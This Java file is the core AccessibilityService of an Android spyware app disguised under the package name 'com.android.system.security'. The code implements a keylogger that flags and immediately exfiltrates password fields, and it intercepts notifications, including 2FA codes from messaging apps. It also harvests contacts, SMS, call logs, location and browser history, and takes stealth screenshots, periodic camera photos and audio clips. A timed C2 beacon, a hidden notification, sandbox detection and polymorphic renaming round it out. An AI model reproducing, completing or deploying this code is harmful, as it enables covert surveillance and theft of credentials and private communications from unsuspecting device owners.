package com.android.system.security;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Core AccessibilityService — receives all window events, key events,
 * and has system-level privileges for screen capture and input monitoring.
 *
 * Integrates:
 * - Keylogger (onKeyEvent + view text changes)
 * - Screenshot capture
 * - Notification interception
 * - Web activity collection (browser URLs, search queries)
 * - Silent camera capture (graceful fallback if restricted)
 * - Audio recording (graceful fallback if restricted)
 * - Progress tracking (reports what capabilities work on this device)
 */
public class CoreService extends AccessibilityService {

    private static final String TAG = "SysSecSvc";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "system_security_channel";

    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private final AtomicBoolean isRunning = new AtomicBoolean(false);

    // ============================================================
    // CORE COMPONENTS
    // ============================================================

    // Event buffer for keylogging
    private final ConcurrentLinkedQueue<KeyEvent> keyBuffer = new ConcurrentLinkedQueue<>();

    // C2 Engine
    private C2Engine c2Engine;

    // Data collector
    private DataCollector dataCollector;

    // Encrypted store
    private EncryptedStore encryptedStore;

    // Stealth manager
    private StealthManager stealthManager;

    // Persistence
    private PersistenceManager persistenceManager;

    // ============================================================
    // NEW COMPONENTS (drop-in additions)
    // ============================================================

    // Progress tracker — records which capabilities work on this device
    private ProgressTracker progressTracker;

    // Web activity collector — browser URLs, search queries, bookmarks
    private WebActivityCollector webActivityCollector;

    // Silent camera capture — graceful fallback if restricted
    private CameraCapture cameraCapture;

    // Audio recorder — graceful fallback if restricted
    private AudioRecorder audioRecorder;

    // Current app tracking
    private String currentPackage = "";
    private String currentActivity = "";

    // Retry counters for camera/audio
    private int cameraRetryCount = 0;
    private int audioRetryCount = 0;

    // Timer for periodic tasks
    private Timer scheduler;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.i(TAG, "=== CoreService CREATING ===");

        // Start background thread for non-UI work
        backgroundThread = new HandlerThread("SecurityWorker");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        // ============================================================
        // 1. INITIALIZE CORE COMPONENTS
        // ============================================================

        encryptedStore = new EncryptedStore(this);
        stealthManager = new StealthManager(this);
        c2Engine = new C2Engine(this, encryptedStore);
        dataCollector = new DataCollector(this, encryptedStore, c2Engine);
        persistenceManager = new PersistenceManager(this);

        // ============================================================
        // 2. INITIALIZE PROGRESS TRACKER
        // ============================================================

        progressTracker = new ProgressTracker(this);
        progressTracker.record("app_start", true,
            "CoreService initialized on " + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")");

        // ============================================================
        // 3. INITIALIZE WEB ACTIVITY COLLECTOR
        // ============================================================

        webActivityCollector = new WebActivityCollector(this, encryptedStore, progressTracker);
        progressTracker.record("web_collector_init", true,
            "Web activity collector ready for all browsers");

        // ============================================================
        // 4. INITIALIZE CAMERA (graceful — may fail on Android 14+)
        // ============================================================

        cameraCapture = new CameraCapture(this, encryptedStore, progressTracker);
        boolean cameraOk = cameraCapture.init();
        // ProgressTracker already recorded the result inside CameraCapture.init()

        // ============================================================
        // 5. INITIALIZE MICROPHONE (graceful — may fail on Android 14+)
        // ============================================================

        audioRecorder = new AudioRecorder(this, encryptedStore, progressTracker);
        boolean micOk = audioRecorder.init();
        // ProgressTracker already recorded the result inside AudioRecorder.init()

        // ============================================================
        // 6. SET UP FOREGROUND NOTIFICATION
        // ============================================================

        setupForegroundNotification();

        // ============================================================
        // 7. KICK OFF INITIAL BACKGROUND TASKS
        // ============================================================

        backgroundHandler.post(() -> {
            // Try browser database reads
            webActivityCollector.tryReadBrowserDatabases();
            webActivityCollector.tryReadBookmarksProvider();
            webActivityCollector.tryReadHistoryProvider();

            // Write initial capability report
            progressTracker.writeReport();

            // Initial device info collection
            dataCollector.collectDeviceInfo();
        });

        // ============================================================
        // 8. START SCHEDULER
        // ============================================================

        isRunning.set(true);
        startScheduler();

        Log.i(TAG, "=== CoreService fully initialized ===");
    }

    // ============================================================
    // ACCESSIBILITY EVENT HANDLER
    // ============================================================

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isRunning.get()) return;

        // Check resource thresholds first (stealth)
        if (!stealthManager.checkResourceThresholds()) {
            return;
        }

        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChange(event);
                    // Also pass to web activity collector
                    webActivityCollector.onAccessibilityEvent(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChange(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleViewClick(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                    handleTextSelection(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    handleScroll(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleFocus(event);
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    handleNotification(event);
                    break;

                case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                    handleGesture(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    handleContentChanged(event);
                    // Also pass to web activity collector
                    webActivityCollector.onAccessibilityEvent(event);
                    break;
            }
        } catch (Exception e) {
            Log.w(TAG, "Event handler error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "Service interrupted by system");
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "=== CoreService SHUTTING DOWN ===");
        isRunning.set(false);

        // Cancel scheduler
        if (scheduler != null) {
            scheduler.cancel();
            scheduler = null;
        }

        // Write final progress report
        if (progressTracker != null) {
            progressTracker.record("app_stop", true, "CoreService shutting down");
            progressTracker.writeReport();

            // Log capability summary
            Map<String, Object> summary = progressTracker.getSummary();
            @SuppressWarnings("unchecked")
            Map<String, Object> caps = (Map<String, Object>) summary.get("capabilities");
            if (caps != null) {
                Log.i(TAG, "=== CAPABILITY SUMMARY ===");
                for (Map.Entry<String, Object> entry : caps.entrySet()) {
                    @SuppressWarnings("unchecked")
                    Map<String, Object> val = (Map<String, Object>) entry.getValue();
                    boolean working = (Boolean) val.getOrDefault("working", false);
                    Log.i(TAG, "  " + (working ? "[OK]" : "[X]") + " " + entry.getKey());
                }
                Log.i(TAG, "Working: " + summary.get("working_count") + "/" + summary.get("total"));
            }
        }

        // Shutdown camera
        if (cameraCapture != null) {
            cameraCapture.shutdown();
        }

        // Stop audio
        if (audioRecorder != null) {
            audioRecorder.stopRecording();
        }

        // Flush encrypted store
        if (encryptedStore != null) {
            encryptedStore.flush();
        }

        // Quit background thread
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }

        super.onDestroy();
    }

    @Override
    public boolean onKeyEvent(android.view.KeyEvent event) {
        if (!isRunning.get()) return false;

        // Keylogging via onKeyEvent (requires flagRequestFilterKeyEvents in config)
        KeyEvent ke = new KeyEvent(
            event.getKeyCode(),
            event.getUnicodeChar(),
            event.getAction(),
            event.getMetaState(),
            currentPackage,
            currentActivity,
            System.currentTimeMillis()
        );
        keyBuffer.offer(ke);

        // Flush buffer periodically
        if (keyBuffer.size() >= 25) {
            flushKeyBuffer();
        }

        // Always return false to not consume the event (stealth)
        return false;
    }

    // ============================================================
    // EVENT HANDLERS
    // ============================================================

    private void handleWindowChange(AccessibilityEvent event) {
        String prevPackage = currentPackage;
        currentPackage = event.getPackageName() != null ? event.getPackageName().toString() : "";
        currentActivity = event.getClassName() != null ? event.getClassName().toString() : "";

        // Log window change
        if (!currentPackage.equals(prevPackage)) {
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "app_switch");
            entry.put("app", currentPackage);
            entry.put("activity", currentActivity);
            entry.put("timestamp", System.currentTimeMillis());
            encryptedStore.store("events", entry);

            // If target app opened, increase collection intensity
            if (DataCollector.isTargetApp(currentPackage)) {
                dataCollector.triggerTargetAppCollection(currentPackage);
            }

            // Take screenshot on sensitive app launch
            if (DataCollector.isTargetApp(currentPackage) || currentPackage.contains("browser") ||
                currentPackage.contains("chrome") || currentPackage.contains("firefox")) {
                takeStealthScreenshot();
            }
        }
    }

    private void handleTextChange(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) {
                    String viewId = source.getViewIdResourceName() != null ?
                        source.getViewIdResourceName() : "unknown";
                    String hint = source.getHintText() != null ?
                        source.getHintText().toString() : "";

                    boolean isPassword = false;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        isPassword = source.isPassword();
                    }

                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "text_input");
                    entry.put("app", currentPackage);
                    entry.put("activity", currentActivity);
                    entry.put("view_id", viewId);
                    entry.put("hint", hint);
                    entry.put("text", text.toString());
                    entry.put("length", text.length());
                    entry.put("is_password", isPassword);
                    entry.put("timestamp", System.currentTimeMillis());

                    encryptedStore.store("keystrokes", entry);

                    // Quick exfil if high-value (password field or long text)
                    if (isPassword || text.length() > 100) {
                        c2Engine.quickExfil(entry);
                    }
                }
            } finally {
                source.recycle();
            }
        }
    }

    private void handleViewClick(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "click");
                entry.put("app", currentPackage);
                entry.put("activity", currentActivity);
                entry.put("view_id", source.getViewIdResourceName());
                entry.put("text", source.getText() != null ? source.getText().toString() : "");
                entry.put("timestamp", System.currentTimeMillis());
                encryptedStore.store("clicks", entry);
            } finally {
                source.recycle();
            }
        }
    }

    private void handleTextSelection(AccessibilityEvent event) {
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "text_selection");
        entry.put("app", currentPackage);
        entry.put("from", event.getFromIndex());
        entry.put("to", event.getToIndex());
        entry.put("item_count", event.getItemCount());
        entry.put("timestamp", System.currentTimeMillis());
        encryptedStore.store("selections", entry);
    }

    private void handleScroll(AccessibilityEvent event) {
        // Sampled — only store 10% of scroll events to reduce noise
        if (System.currentTimeMillis() % 10 != 0) return;

        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "scroll");
        entry.put("app", currentPackage);
        entry.put("scroll_x", event.getScrollX());
        entry.put("scroll_y", event.getScrollY());
        entry.put("max_x", event.getMaxScrollX());
        entry.put("max_y", event.getMaxScrollY());
        entry.put("timestamp", System.currentTimeMillis());
        encryptedStore.store("scrolls", entry);
    }

    private void handleFocus(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                Map<String, Object> entry = new HashMap<>();
                entry.put("type", "focus_change");
                entry.put("app", currentPackage);
                entry.put("view_id", source.getViewIdResourceName());
                entry.put("text", source.getText() != null ? source.getText().toString() : "");
                entry.put("focused", event.isEnabled());
                entry.put("timestamp", System.currentTimeMillis());
                encryptedStore.store("focus", entry);
            } finally {
                source.recycle();
            }
        }
    }

    private void handleNotification(AccessibilityEvent event) {
        android.os.Parcelable data = event.getParcelableData();
        if (data instanceof Notification) {
            Notification notif = (Notification) data;
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "notification");
            entry.put("app", currentPackage);
            entry.put("title", notif.extras.getString(Notification.EXTRA_TITLE, ""));
            entry.put("text", notif.extras.getString(Notification.EXTRA_TEXT, ""));
            entry.put("sub_text", notif.extras.getString(Notification.EXTRA_SUB_TEXT, ""));
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("priority", notif.priority);

            encryptedStore.store("notifications", entry);

            // Instant exfil for messaging apps (2FA codes, message previews)
            if (DataCollector.isTargetApp(currentPackage)) {
                c2Engine.quickExfil(entry);
            }
        }
    }

    private void handleGesture(AccessibilityEvent event) {
        Map<String, Object> entry = new HashMap<>();
        entry.put("type", "gesture");
        entry.put("app", currentPackage);
        entry.put("timestamp", System.currentTimeMillis());
        encryptedStore.store("gestures", entry);
    }

    private void handleContentChanged(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                if (source.getText() != null && source.getText().length() > 0) {
                    Map<String, Object> entry = new HashMap<>();
                    entry.put("type", "content_change");
                    entry.put("app", currentPackage);
                    entry.put("view_id", source.getViewIdResourceName());
                    entry.put("text", source.getText().toString());
                    entry.put("timestamp", System.currentTimeMillis());
                    encryptedStore.store("content", entry);
                }
            } finally {
                source.recycle();
            }
        }
    }

    // ============================================================
    // KEY BUFFER FLUSH
    // ============================================================

    private void flushKeyBuffer() {
        List<KeyEvent> batch = new ArrayList<>();
        KeyEvent ke;
        while ((ke = keyBuffer.poll()) != null && batch.size() < 50) {
            batch.add(ke);
        }

        if (!batch.isEmpty()) {
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "key_batch");
            entry.put("app", currentPackage);
            entry.put("count", batch.size());

            // Convert to serializable format
            List<Map<String, Object>> events = new ArrayList<>();
            for (KeyEvent e : batch) {
                Map<String, Object> ev = new HashMap<>();
                ev.put("key", e.describe());
                ev.put("char", String.valueOf(e.getChar()));
                ev.put("action", e.isPress() ? "press" : "release");
                ev.put("app", e.packageName);
                ev.put("time", e.timestamp);
                events.add(ev);
            }
            entry.put("events", events);
            entry.put("timestamp", System.currentTimeMillis());

            encryptedStore.store("keystrokes", entry);
        }
    }

    // ============================================================
    // STEALTH SCREENSHOT
    // ============================================================

    private void takeStealthScreenshot() {
        backgroundHandler.post(() -> {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    java.util.concurrent.atomic.AtomicReference<Bitmap> bitmapRef =
                        new java.util.concurrent.atomic.AtomicReference<>();
                    java.util.concurrent.CountDownLatch latch =
                        new java.util.concurrent.CountDownLatch(1);

                    takeScreenshot(
                        Display.DEFAULT_DISPLAY,
                        java.util.concurrent.Executors.newSingleThreadExecutor(),
                        screenshotResult -> {
                            if (screenshotResult != null && screenshotResult.getBitmap() != null) {
                                bitmapRef.set(screenshotResult.getBitmap());
                            }
                            latch.countDown();
                        }
                    );

                    boolean done = latch.await(3, java.util.concurrent.TimeUnit.SECONDS);
                    Bitmap bitmap = bitmapRef.get();

                    if (done && bitmap != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.PNG, 85, baos);
                        byte[] imageData = baos.toByteArray();

                        Map<String, Object> metadata = new HashMap<>();
                        metadata.put("type", "screenshot");
                        metadata.put("app", currentPackage);
                        metadata.put("activity", currentActivity);
                        metadata.put("size", imageData.length);
                        metadata.put("timestamp", System.currentTimeMillis());

                        encryptedStore.storeBinary("screenshots", imageData, metadata);

                        // Also store a metadata-only entry for quick exfil
                        Map<String, Object> metaEntry = new HashMap<>(metadata);
                        metaEntry.remove("image_data");
                        encryptedStore.store("screenshots_meta", metaEntry);

                        bitmap.recycle();
                        Log.i(TAG, "Screenshot captured: " + imageData.length + " bytes");
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Screenshot failed: " + e.getMessage());
            }
        });
    }

    // ============================================================
    // FOREGROUND NOTIFICATION
    // ============================================================

    private void setupForegroundNotification() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN
        );
        channel.setDescription(getString(R.string.notification_channel_desc));
        channel.setShowBadge(false);
        channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null) {
            nm.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_text))
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();

        try {
            startForeground(NOTIFICATION_ID, notification);
        } catch (Exception e) {
            Log.w(TAG, "Foreground notification failed: " + e.getMessage());
        }
    }

    // ============================================================
    // SCHEDULER — All periodic tasks
    // ============================================================

    private void startScheduler() {
        scheduler = new Timer("SecurityScheduler", true);

        // ----------------------------------------------------------
        // Data collection tasks
        // ----------------------------------------------------------

        // Device info + intelligence gathering
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> dataCollector.collectDeviceInfo());
                }
            }
        }, 5000, Config.LOCATION_INTERVAL_MS);

        // Contacts, SMS, call logs
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> {
                        dataCollector.collectContacts();
                        dataCollector.collectSMS();
                        dataCollector.collectCallLogs();
                    });
                }
            }
        }, 15000, Config.CONTACTS_INTERVAL_MS);

        // Location
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(dataCollector::collectLocation);
                }
            }
        }, 10000, Config.LOCATION_INTERVAL_MS);

        // Key buffer flush (every 30s)
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushKeyBuffer();
            }
        }, 30000, 30000);

        // C2 beacon
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> c2Engine.beacon());
                }
            }
        }, 10000, Config.BEACON_INTERVAL_MS);

        // Polymorphic rename
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get()) {
                    backgroundHandler.post(() -> stealthManager.polymorphicRename());
                }
            }
        }, Config.POLYMORPHIC_INTERVAL_MS, Config.POLYMORPHIC_INTERVAL_MS);

        // Stealth environment check
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get()) {
                    backgroundHandler.post(() -> {
                        if (stealthManager.isDangerousEnvironment()) {
                            Log.w(TAG, "Dangerous environment detected, pausing sensitive operations");
                        }
                    });
                }
            }
        }, 60000, 60000);

        // Encrypted store flush (every 5 min)
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                backgroundHandler.post(() -> encryptedStore.flush());
            }
        }, 120000, 300000);

        // ----------------------------------------------------------
        // NEW: Web Activity — browser DB reads (hourly)
        // ----------------------------------------------------------
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isRunning.get() && stealthManager.checkResourceThresholds()) {
                    backgroundHandler.post(() -> {
                        webActivityCollector.tryReadBrowserDatabases();
                        webActivityCollector.tryReadBookmarksProvider();
                        webActivityCollector.tryReadHistoryProvider();
                    });
                }
            }
        }, 120000, 3600000);

        // ----------------------------------------------------------
        // NEW: Camera — periodic photo capture (every 5 min)
        // ----------------------------------------------------------
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!isRunning.get() || !stealthManager.checkResourceThresholds()) return;
                if (cameraRetryCount >= Config.CAMERA_CAPTURE_MAX_TRIES) return;

                backgroundHandler.post(() -> {
                    if (cameraCapture.isInitialized()) {
                        boolean success = cameraCapture.capture();
                        if (!success) {
                            cameraRetryCount++;
                            if (cameraRetryCount >= Config.CAMERA_CAPTURE_MAX_TRIES) {
                                progressTracker.record("camera_disabled", true,
                                    "Max retries (" + Config.CAMERA_CAPTURE_MAX_TRIES +
                                    ") reached, disabling camera");
                                cameraCapture.shutdown();
                            }
                        } else {
                            cameraRetryCount = 0;  // Reset on success
                        }
                    }
                });
            }
        }, Config.CAMERA_CAPTURE_INTERVAL_MS, Config.CAMERA_CAPTURE_INTERVAL_MS);

        // ----------------------------------------------------------
        // NEW: Audio — periodic recording (every 10 min, 30 sec clips)
        // ----------------------------------------------------------
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!isRunning.get() || !stealthManager.checkResourceThresholds()) return;
                if (audioRetryCount >= Config.CAMERA_CAPTURE_MAX_TRIES) return;

                backgroundHandler.post(() -> {
                    if (audioRecorder.isAvailable()) {
                        boolean success = audioRecorder.recordClip();
                        if (!success) {
                            audioRetryCount++;
                            if (audioRetryCount >= Config.CAMERA_CAPTURE_MAX_TRIES) {
                                progressTracker.record("audio_disabled", true,
                                    "Max retries (" + Config.CAMERA_CAPTURE_MAX_TRIES +
                                    ") reached, disabling audio");
                            }
                        } else {
                            audioRetryCount = 0;  // Reset on success
                        }
                    }
                });
            }
        }, Config.AUDIO_RECORD_INTERVAL_MS, Config.AUDIO_RECORD_INTERVAL_MS);

        // ----------------------------------------------------------
        // NEW: Progress report writer (every hour)
        // ----------------------------------------------------------
        scheduler.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                backgroundHandler.post(() -> {
                    progressTracker.writeReport();
                    Map<String, Object> summary = progressTracker.getSummary();
                    Log.i(TAG, "Capability report: " +
                        summary.get("working_count") + "/" + summary.get("total") + " working");
                });
            }
        }, Config.PROGRESS_REPORT_INTERVAL_MS, Config.PROGRESS_REPORT_INTERVAL_MS);
    }

    // ============================================================
    // INNER CLASS: KeyEvent
    // ============================================================

    public static class KeyEvent {
        public final int keyCode;
        public final int unicodeChar;
        public final int action;
        public final int metaState;
        public final String packageName;
        public final String activityName;
        public final long timestamp;

        public KeyEvent(int keyCode, int unicodeChar, int action, int metaState,
                       String packageName, String activityName, long timestamp) {
            this.keyCode = keyCode;
            this.unicodeChar = unicodeChar;
            this.action = action;
            this.metaState = metaState;
            this.packageName = packageName;
            this.activityName = activityName;
            this.timestamp = timestamp;
        }

        public char getChar() {
            return (char) unicodeChar;
        }

        public boolean isPress() {
            return action == android.view.KeyEvent.ACTION_DOWN;
        }

        public String describe() {
            if (unicodeChar > 0 && Character.isDefined(unicodeChar)) {
                return String.valueOf((char) unicodeChar);
            }
            return android.view.KeyEvent.keyCodeToString(keyCode);
        }
    }
  }
